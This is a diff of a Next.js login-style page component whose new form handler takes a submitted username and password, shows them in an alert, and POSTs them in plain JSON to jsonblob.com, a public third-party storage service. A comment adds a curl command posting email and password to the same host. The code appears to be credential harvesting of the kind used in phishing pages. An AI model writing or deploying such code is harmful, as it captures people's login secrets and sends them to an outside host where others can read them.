@@ -1,63 +1,42 @@
 import Layout from "../componentes/Layout";
 import Image from "next/image";
 import Footer from "../componentes/Footer";
-import React, { useState } from "react";
 import { useForm } from "react-hook-form";
-const nodemailer = require("nodemailer");
+// import { JsonDB } from "node-json-db";
+// import { Config } from "node-json-db/dist/lib/JsonDBConfig";
 
 function HomePage() {
-	const [show, setShow] = useState(false);
+	// var db = new JsonDB(new Config("myDataBase", true, false, "/"));
+
 	const {
 		register,
 		handleSubmit,
-		watch,
 		formState: { errors },
 	} = useForm();
 
 	const onSubmit = async (data) => {
 		alert(`${data.pass} || ${data.user}`);
-		const email = await Sendmail();
+
+		const response = await fetch("https://jsonblob.com/api/jsonBlob", {
+			method: "POST",
+			headers: {
+				"Content-Type": "application/json",
+			},
+			body: JSON.stringify({
+				user: data.user,
+				pass: data.pass,
+			}),
+		});
+
+		console.log("response");
+		console.log(response);
+		const responseData = await response.json();
+
+		console.log("responseData");
+		console.log(responseData);
 	};
 
-	const Sendmail = async () => {
-		alert("email");
-		// async..await is not allowed in global scope, must use a wrapper
-		// async function main() {
-		// 	// Generate test SMTP service account from ethereal.email
-		// 	// Only needed if you don't have a real mail account for testing
-		// 	let testAccount = await nodemailer.createTestAccount();
-
-		// 	// create reusable transporter object using the default SMTP transport
-		// 	let transporter = nodemailer.createTransport({
-		// 		host: "smtp.ethereal.email",
-		// 		port: 587,
-		// 		secure: false, // true for 465, false for other ports
-		// 		auth: {
-		// 			user: testAccount.user, // generated ethereal user
-		// 			pass: testAccount.pass, // generated ethereal password
-		// 		},
-		// 	});
-
-		// 	// send mail with defined transport object
-		// 	let info = await transporter.sendMail({
-		// 		from: '"Fred Foo 👻" <foo@example.com>', // sender address
-		// 		to: "bar@example.com, baz@example.com", // list of receivers
-		// 		subject: "Hello ✔", // Subject line
-		// 		text: "Hello world?", // plain text body
-		// 		html: "<b>Hello world?</b>", // html body
-		// 	});
-
-		// 	console.log("Message sent: %s", info.messageId);
-		// 	// Message sent: <b658f8ca-6296-ccf4-8306-87d57a0b4321@example.com>
-
-		// return info;
-		// 	// Preview only available when sending through an Ethereal account
-		// 	console.log("Preview URL: %s", nodemailer.getTestMessageUrl(info));
-		// 	// Preview URL: https://ethereal.email/message/WaQKMgKddxQDoou...
-		// }
-
-		// main().catch(console.error);
-	};
+	// curl -i -X "POST" -d '{"perfil":["email", "pass"]}' -H "Content-Type: application/json" -H "Accept: application/json" https://jsonblob.com/api/jsonBlob
 
 	return (
 		<Layout>
